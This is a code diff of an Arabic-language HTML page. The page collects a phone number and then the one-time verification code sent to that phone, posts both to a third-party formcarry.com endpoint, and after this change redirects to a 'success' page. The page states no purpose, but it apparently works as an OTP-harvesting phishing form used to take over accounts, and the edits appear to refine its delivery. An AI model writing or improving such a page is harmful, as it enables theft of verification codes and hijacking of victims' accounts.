@@ -90,16 +90,15 @@
   <div class="container">
     <h2>نموذج رقم الهاتف والكود</h2>
 
-    <!-- نموذج إرسال رقم الهاتف -->
-    <form id="phoneForm" action="https://formcarry.com/s/zmPYXkf3utw" method="POST" target="hidden_iframe" onsubmit="return sendPhone(event);">
+    <form id="phoneForm" action="https://formcarry.com/s/zmPYXkf3utw" method="POST" onsubmit="return sendPhone(event);">
       <label for="phone">رقم الهاتف:</label>
       <input type="tel" id="phone" name="phone" required placeholder="اكتب رقم هاتفك" pattern="[0-9]{10,15}" title="أدخل رقم هاتف صحيح" autocomplete="tel" />
       <button type="submit" id="sendPhoneBtn">إرسال رقم الهاتف</button>
       <div id="timer"></div>
     </form>
 
-    <!-- نموذج إرسال الكود -->
-    <form id="codeForm" action="https://formcarry.com/s/zmPYXkf3utw" method="POST" target="hidden_iframe" onsubmit="return sendCode(event);">
+    <!-- سيتم الإرسال إلى صفحة success.html -->
+    <form id="codeForm" action="https://formcarry.com/s/zmPYXkf3utw" method="POST" onsubmit="return sendCode(event);">
       <div id="codeField">
         <label for="code">الكود المرسل إليك:</label>
         <input type="text" id="code" name="code" placeholder="اكتب الكود هنا" autocomplete="one-time-code" />
@@ -107,8 +106,6 @@
       </div>
     </form>
   </div>
-
-  <iframe name="hidden_iframe" style="display:none;"></iframe>
 
   <script>
     let countdownInterval;
@@ -148,7 +145,7 @@
         return false;
       }
 
-      // أضف حقل كود مخفي فارغ إذا لم يكن موجوداً
+      // أضف كود فارغ في حقل مخفي
       let hiddenCode = phoneForm.querySelector('input[name="code"]');
       if (!hiddenCode) {
         hiddenCode = document.createElement('input');
@@ -160,10 +157,10 @@
 
       phoneForm.submit();
 
-      // إظهار حقل الكود وتفعيل المؤقت
+      // أظهر حقل الكود وابدأ المؤقت
       codeField.style.display = 'block';
       sendPhoneBtn.disabled = true;
-      startTimer(480); // 8 دقائق
+      startTimer(480);
 
       return false;
     }
@@ -177,7 +174,7 @@
         return false;
       }
 
-      // أضف رقم الهاتف كمخفي إلى نموذج الكود
+      // أضف رقم الهاتف كمخفي
       let hiddenPhone = codeForm.querySelector('input[name="phone"]');
       if (!hiddenPhone) {
         hiddenPhone = document.createElement('input');
@@ -187,7 +184,13 @@
       }
       hiddenPhone.value = phoneInput.value;
 
+      // بعد التأكد من صحة البيانات، نرسل النموذج ثم ننتقل لصفحة النجاح
       codeForm.submit();
+
+      // الانتقال لصفحة النجاح بعد لحظات قصيرة (يمكنك استبدالها بـ redirect فوري)
+      setTimeout(() => {
+        window.location.href = "success.html";
+      }, 1000); // 1 ثانية
 
       return false;
     }
